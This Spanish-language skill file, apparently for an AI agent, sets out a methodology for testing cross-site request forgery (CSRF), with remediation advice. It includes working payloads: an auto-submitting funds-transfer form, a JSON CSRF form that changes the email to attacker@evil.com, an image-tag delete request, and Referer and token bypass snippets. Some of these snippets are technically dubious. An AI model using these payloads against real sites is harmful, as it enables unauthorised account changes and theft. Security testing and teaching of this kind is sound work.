---
name: csrf-testing
description: Habilidades profesionales y metodología para pruebas de falsificación de solicitudes entre sitios (CSRF)
version: 1.0.0
---

# Pruebas de falsificación de solicitudes entre sitios (CSRF)

## Descripción general

CSRF (Cross-Site Request Forgery) es un ataque que aprovecha el estado de sesión iniciada de un usuario para realizar operaciones no autorizadas. Esta habilidad proporciona métodos para la detección, explotación y protección contra vulnerabilidades CSRF.

## Principio de la vulnerabilidad

- El atacante induce al usuario a visitar una página maliciosa.
- La página maliciosa envía automáticamente una solicitud al sitio web objetivo.
- El navegador incluye automáticamente la información de autenticación del usuario (Cookie, Session).
- El sitio web objetivo asume erróneamente que es una operación legítima del usuario.

## Metodología de pruebas

### 1. Identificar operaciones sensibles

- Cambio de contraseña
- Cambio de correo electrónico
- Operaciones de transferencia
- Cambios de permisos
- Eliminación de datos
- Actualización de estado

### 2. Detectar CSRF Token

**Comprobar si hay protección con Token:**
```html
<!-- Con protección de Token -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- Sin protección de Token - Existe riesgo de CSRF -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Validar la efectividad del Token

**Probar si el Token es predecible:**
- ¿El Token se basa en una marca de tiempo?
- ¿El Token se basa en el ID de usuario?
- ¿El Token es reutilizable?
- ¿El Token se comparte entre múltiples solicitudes?

### 4. Comprobar la validación del Referer

**Probar si la comprobación del Referer se puede eludir:**
```javascript
// Solicitud normal
Referer: https://target.com/change-password

// Prueba de evasión
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (vacío)
```

## Técnicas de explotación

### Ataque CSRF básico

**Envío automático de formulario HTML:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Eludir la comprobación de Content-Type:**
```html
<!-- Usar formulario para enviar JSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF por solicitud GET

**Aprovechar solicitudes GET para el ataque:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Técnicas de evasión

### Evasión de Token

**Si el Token está en la Cookie:**
```javascript
// Si el Token existe tanto en la Cookie como en el formulario
// Puedes intentar enviar solo el Token de la Cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // No incluye el parámetro csrf_token, depende de la Cookie
});
```

### Evasión de SameSite Cookie

**Aprovechar subdominios:**
- Si SameSite=Lax, las solicitudes GET aún pueden llevar Cookies.
- Aprovechar subdominios para realizar el ataque.

### Doble envío de Cookie

**Eludir la validación del Token:**
```html
<!-- Si el Token está en la Cookie y la lógica de validación es defectuosa -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Leer el Token de la Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Uso de herramientas

### Burp Suite

**Usar el generador de PoC CSRF:**
1. Interceptar la solicitud objetivo.
2. Clic derecho → Engagement tools → Generate CSRF PoC.
3. Probar el PoC generado.

### OWASP ZAP

```bash
# Usar ZAP para escaneo CSRF
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Validación y reporte

### Pasos de validación

1. Confirmar que la operación objetivo no tiene protección de CSRF Token.
2. Construir una solicitud maliciosa y verificar que sea ejecutable.
3. Evaluar el impacto (fuga de datos, escalada de privilegios, pérdida de fondos, etc.).
4. Registrar el PoC completo.

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y operaciones afectadas.
- Escenario de ataque y alcance del impacto.
- Pasos completos de explotación y PoC.
- Recomendaciones de remediación (CSRF Token, SameSite Cookie, validación de Referer, etc.).

## Medidas de protección

### Soluciones recomendadas

1. **CSRF Token**
   - Cada formulario incluye un Token único.
   - El Token se almacena en la Session.
   - Validar la efectividad del Token.

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Doble envío de Cookie**
   - El Token existe simultáneamente en la Cookie y en el formulario.
   - Validar si ambos coinciden.

4. **Validación de Referer**
   - Validar si el Referer es del mismo origen.
   - Prestar atención al manejo de Referer vacío.

## Consideraciones

- Realizar pruebas únicamente en entornos autorizados.
- Evitar causar un impacto real en las cuentas de los usuarios.
- Registrar todos los pasos de las pruebas.
- Considerar las diferencias de comportamiento entre distintos navegadores.